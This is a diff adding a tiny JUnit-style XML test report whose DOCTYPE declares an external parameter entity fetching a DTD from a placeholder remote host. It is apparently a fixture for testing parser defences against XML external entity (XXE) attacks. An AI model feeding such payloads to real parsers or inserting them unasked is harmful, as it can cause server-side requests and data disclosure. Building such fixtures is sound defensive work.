@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE testsuite [ <!ENTITY % remote SYSTEM "https://example.invalid/x.dtd"> %remote; ]>
+<testsuite name="s" tests="1"><testcase classname="t" name="a"/></testsuite>
